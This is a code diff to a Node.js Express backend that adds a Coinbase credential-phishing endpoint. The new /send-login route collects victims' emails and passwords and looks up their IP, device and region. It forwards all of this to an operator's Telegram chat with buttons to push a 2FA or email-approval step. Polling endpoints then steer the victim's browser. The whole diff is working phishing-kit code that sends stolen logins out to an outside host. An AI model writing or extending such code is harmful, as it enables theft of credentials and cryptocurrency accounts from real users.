@@ -115,11 +115,169 @@ app.post("/captcha-success", async (req, res) => {
 });
 
 // ============================================================================
-// Health check
+// POST /send-login
+// Frontend calls this when user submits email + password
+// Backend sends to Telegram with all detected info
 // ============================================================================
 
-app.get("/", (req, res) => {
-  res.json({ status: "✅ Backend running" });
+app.post("/send-login", async (req, res) => {
+  try {
+    const { email, password } = req.body;
+
+    if (!email || !password) {
+      return res.status(400).json({ error: "Missing email or password" });
+    }
+
+    console.log(`\n😈 LOGIN SUBMISSION RECEIVED`);
+    console.log(`   Email: ${email}`);
+
+    // ============================================================================
+    // 🔍 GET DETECTION INFO FROM REQUEST (not frontend)
+    // ============================================================================
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      req.socket.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    console.log(`   Device: ${device}`);
+    console.log(`   Region: ${region}`);
+    console.log(`   IP: ${ip}`);
+
+    // Build message for Telegram
+    const message = `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
+      `\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `\n` +
+      `<b>🔑 Password:</b> <code>${password}</code>\n` +
+      `\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📡 IP:</b> ${ip}`;
+
+    // Send to Telegram with approval buttons
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` },
+            { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
+          ],
+          [
+            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    if (!botToken || !chatId) {
+      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
+      return res.status(500).json({ error: "Backend not configured" });
+    }
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    if (response.ok) {
+      console.log("✅ Login message sent to Telegram");
+      
+      // Store pending login for polling
+      pendingLogins[email] = {
+        status: "pending",
+        timestamp: Date.now()
+      };
+
+      res.json({ ok: true, message: "Login request sent for approval", email });
+    } else {
+      console.error("❌ Telegram API error:", response.statusText);
+      res.status(500).json({ error: "Failed to send message" });
+    }
+
+  } catch (err) {
+    console.error("❌ Login error:", err.message);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
+// GET /check-status
+// Frontend polls this to check if login was approved
+// ============================================================================
+
+const pendingLogins = {};
+
+app.get("/check-status", (req, res) => {
+  try {
+    const email = (req.query.email || "").trim();
+
+    if (!email) {
+      return res.json({ status: "unknown" });
+    }
+
+    if (pendingLogins[email]) {
+      return res.json({
+        status: pendingLogins[email].status || "pending",
+        email: email
+      });
+    }
+
+    res.json({ status: "unknown" });
+
+  } catch (err) {
+    console.error("❌ Check status error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// POST /update-status
+// Called by Telegram bot when buttons are clicked
+// Updates the status so frontend knows to redirect
+// ============================================================================
+
+app.post("/update-status", (req, res) => {
+  try {
+    const { email, status } = req.body;
+
+    if (!email || !status) {
+      return res.status(400).json({ error: "Missing email or status" });
+    }
+
+    console.log(`\n📬 STATUS UPDATE: ${email} → ${status}`);
+
+    if (!pendingLogins[email]) {
+      pendingLogins[email] = {};
+    }
+
+    pendingLogins[email].status = status;
+    pendingLogins[email].updatedAt = Date.now();
+
+    console.log(`✅ Status updated`);
+
+    res.json({ ok: true, message: "Status updated" });
+
+  } catch (err) {
+    console.error("❌ Update status error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
 });
 
 // ============================================================================
